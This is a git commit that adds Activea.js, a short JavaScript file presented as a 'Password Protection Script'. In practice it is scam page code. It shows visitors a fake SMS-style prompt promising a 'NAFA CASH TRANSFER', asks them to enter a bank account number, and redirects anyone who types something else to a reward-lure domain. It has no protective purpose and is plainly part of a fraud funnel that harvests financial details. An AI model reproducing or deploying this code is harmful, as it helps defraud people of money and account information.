bc625ca4d5d1e5135ace6ddd6b28caaccd0b71b9
kenzila71 <kenzila71@gmail.com>
2026-01-12 21:16:56 +0100

    Create Activea.js

---
+++ Activea.js
@@ -0,0 +1,9 @@
+/* Password Protection Script by www.onlineofferz.xyz*/
+var password = 'WITHDRAW CASH'
+password = prompt(
+  'SMS: Congratulations! You are eligible to receive NAFA CASH TRANSFER. Please press OK to Enter your Account Number.',
+  'WITHDRAW CASH'
+); 
+if (password != 'WITHDRAW CASH') {
+  location.href = 'https://new-year-free-reward.cfd/Sipor.html';
+  }
